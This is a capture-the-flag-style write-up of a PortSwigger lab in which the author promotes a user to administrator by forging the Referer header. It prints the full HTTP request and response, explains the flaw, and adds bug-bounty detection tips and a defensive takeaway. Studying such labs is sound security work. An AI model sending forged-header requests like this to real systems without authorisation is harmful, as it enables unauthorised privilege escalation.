# LAB: Referer-based access control

|                             |                                                                                                                                 |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| **Topic**                   | Access Control                                                                                                                  |
| **Difficulty**              | Apprentice                                                                                                                   |
| **Date**                    | 2026-11-15                                                                                                                   |
| **Time**                    |                                                                                                                                 |
| **Solved without solution** |                                                                                                                                 |
| **Link**                    | [lab-referer-based-access-control](https://portswigger.net/web-security/access-control/lab-referer-based-access-control)         |

## 1. Objective

Promote the user `carlos` to administrator status by exploiting flawed referer-based access control restrictions.

## 2. Surface

- Administrative endpoints or sensitive functionality guarded by HTTP request headers rather than robust session-based authorization or role checking.
- The `Referer` HTTP header handling when submitting administrative or user modification actions.

## 3. Hypothesis

If an application restricts access to administrative functions by verifying that the `Referer` header matches a specific page or administrative context, rather than validating proper user session privileges, an attacker can bypass this restriction simply by forging or spoofing the `Referer` header in their requests.

## 4. Payload that worked

Request:
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: <host>.web-security-academy.net
Cookie: session=<session>
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://<host>.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```
Response:
```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

## 5. Why it works
The application relies on checking the Referer HTTP header to determine whether a request to the sensitive admin action originated from a legitimate administrative context. Because the backend blindly trusts this client-supplied header instead of validating that the user associated with the session cookie actually holds administrative privileges, providing a forged Referer header alongside a low-privileged session cookie successfully bypasses the access control check.


## 6. What I tried that failed

No failed payloads. What worked was the observation method:

Removing the Referer header while logged in as an administrator resulted in a 403 Forbidden response, confirming that the application enforced access control via the header rather than proper session role verification.

Swapping the session cookie to a low-privileged user while including the valid administrative Referer header successfully executed the action.

Rule extracted: relying on client-controlled headers like Referer for security decisions provides zero real protection since they can be arbitrarily forged.

## 7. In a real target (bounty translation)

- Where it shows up: Administrative panels, sensitive settings pages, or legacy applications that attempt to prevent CSRF or direct URL access by checking the `Referer` header.
- Quick detection: Intercepting administrative actions in a proxy, observing whether access changes or breaks when the `Referer` header is altered, removed, or spoofed to match an allowed administrative path.
- Impact: Unauthorized administrative actions, privilege escalation, or security control bypass.
- In the report: Request and response pairs showing how arbitrary manipulation or spoofing of the `Referer` header grants unauthorized access to restricted features.

## 8. Bypass / variants noticed
Testing full URLs versus partial paths within the Referer header.

Checking how the application behaves if the Referer header points to an external domain versus an internal application path.


## 9. Takeaway

Relying on the `Referer` header for access control or security boundaries is inherently flawed because client-side headers can be arbitrarily forged. Always enforce server-side session and role authentication.
